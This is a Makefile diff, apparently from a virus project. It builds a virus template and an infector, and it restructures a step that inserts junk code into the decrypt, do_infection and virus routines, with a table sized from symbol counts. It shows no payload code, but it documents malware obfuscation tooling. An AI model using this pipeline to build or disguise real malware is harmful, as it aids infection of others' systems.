@@ -26,17 +26,20 @@ INFECT = $(addprefix lib/infect/, $(INFECT_SRC))
 
 OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib)
 
-SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(TABLE_C)
+SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS)
 SRC_S = virus/start.s
 
-OBJ	=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_C)))) \
+OBJ_NO_TABLE=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_C)))) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o))
+OBJ =		$(OBJ_NO_TABLE) \
+		$(addprefix $(OBJ_DIR)/, $(patsubst %.c,%.o,$(TABLE_C)))
 
 SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO)
 
 OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_INF_C))))
 
 DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
+		$(addprefix $(OBJ_DIR)/, $(TABLE_C:.c=.d)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))
 
 VIRUS = $(TMP_DIR)/virus.template
@@ -72,13 +75,11 @@ $(OBJ_DIR):
 
 GARBAGE_CF = $(TMP_DIR)/garbage.txt
 
-$(GARBAGE_CF): $(TMP_DIR)
-	echo "0" > $@
+$(OBJ_DIR)/virus/main.s.g.s: $(OBJ_DIR)/virus/main.s
+	./others/scripts/add_garbage $< -p 200 -l decrypt do_infection entry virus
 
-$(OBJ_DIR)/virus/main.s.g.s: $(OBJ_DIR)/virus/main.s $(GARBAGE_CF)
-	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
-
-$(TABLE_C): $(GARBAGE_CF)
+$(TABLE_C): $(OBJ_NO_TABLE)
+	nm $(OBJ) | grep .garb_start | wc -l > $(GARBAGE_CF)
 	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@
 
 $(OBJ_DIR)/%.o: $(OBJ_DIR)/%.s.g.s | $(OBJ_DIR)
